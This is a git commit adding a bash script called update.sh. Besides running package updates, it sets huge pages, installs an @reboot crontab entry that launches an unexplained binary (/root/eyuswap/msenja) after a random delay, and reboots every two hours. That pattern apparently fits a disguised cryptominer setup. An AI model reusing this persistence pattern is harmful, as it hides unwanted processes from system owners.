cc81ca065a8952a279f618d03001fa2c1ffcb2ce
eyuswap <eyuswap@gmail.com>
2020-04-03 20:06:09 +0800

    Create update.sh

---
+++ update.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+sudo apt-get update -y
+sudo apt-get upgrade -y
+cd /root
+echo 2048 > /proc/sys/vm/nr_hugepages
+sysctl -w vm.nr_hugepages=2048
+touch /var/spool/cron/root
+/usr/bin/crontab /var/spool/cron/root
+crontab -l | { cat; echo "@reboot /root/update.sh && sleep $(((RANDOM%60)+1)) && /root/eyuswap/msenja && sleep 7200 && /sbin/shutdown -r now"; } | crontab -
+/etc/init.d/cron restart
+/etc/init.d/cron start
